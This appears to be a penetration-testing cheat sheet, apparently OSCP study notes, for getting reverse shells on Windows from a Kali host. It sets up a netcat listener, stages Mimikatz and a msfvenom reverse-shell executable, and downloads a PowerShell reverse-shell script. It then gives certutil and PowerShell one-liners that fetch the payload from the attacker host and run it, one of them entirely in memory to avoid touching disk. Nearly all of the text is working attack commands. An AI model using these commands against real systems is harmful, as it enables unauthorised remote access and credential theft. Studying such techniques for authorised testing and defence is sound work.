# 1. Setup Kali for connections

## 1.1. Setup listener

```console
nc -nlvp 4444
```

- `-n` : numeric-only IP addresses, no DNS
- `-l` : listen mode, for inbound connects
- `-v` : verbose [use twice to be more verbose]
- `-p` : local port number (port numbers can be individual or ranges: lo-hi [inclusive])

## 1.2. Prepare payload transfer

Prepare files to web server root

☝️ Apache2 is already running with DocumentRoot at `/var/www/html`

If Kali isn't setup as web server, use `python3 -m http.server 80 &> /dev/null &` to run a web server endpoint, the web server root will be the `pwd` where the command was run

### Mimikatz:

```console
cp /usr/share/windows-resources/mimikatz/x64/mimikatz.exe /var/www/html
```

### Windows reverse shell TCP:

```console
msfvenom -p windows/x64/shell_reverse_tcp LHOST=kali.vx LPORT=4444 -f exe -o /var/www/html/reverse.exe
```

### PowerShell-based reverse shell script:

Download the reverse shell scription:

```console
curl -O https://raw.githubusercontent.com/joetanx/oscp/main/reverse.ps1
```

Edit the address and port:

```console
sed -i 's/<ADDRESS>/kali.vx/' reverse.ps1
sed -i 's/<PORT>/4444/' reverse.ps1
```

# 2. Execute payloads on Windows

## 2.1. Execute Windows reverse shell TCP

### Using certutil

```console
certutil.exe /urlcache /f /split http://kali.vx/reverse.exe %USERPROFILE%\reverse.exe && %USERPROFILE%\reverse.exe
```

### Using PowerShell

```console
powershell.exe -NoProfile -ExecutionPolicy Bypass -Command (New-Object System.Net.WebClient).DownloadFile('http://kali.vx/reverse.exe','%USERPROFILE%\reverse.exe'); Start-Process %USERPROFILE%\reverse.exe
```

## 2.2. Execute PowerShell-based reverse shell script

☝️ `Invoke-Expression` is useful if you don't want the payload to touch the disk, but it works for Powershell Scripts only

(i.e. `DownloadFile` of the reverse shell executable and try to run it with `Invoke-Expression` will not work)

```console
powershell.exe -NoProfile -ExecutionPolicy Bypass -Command Invoke-Expression (New-Object System.Net.WebClient).DownloadString('http://kali.vx/reverse.ps1')
```
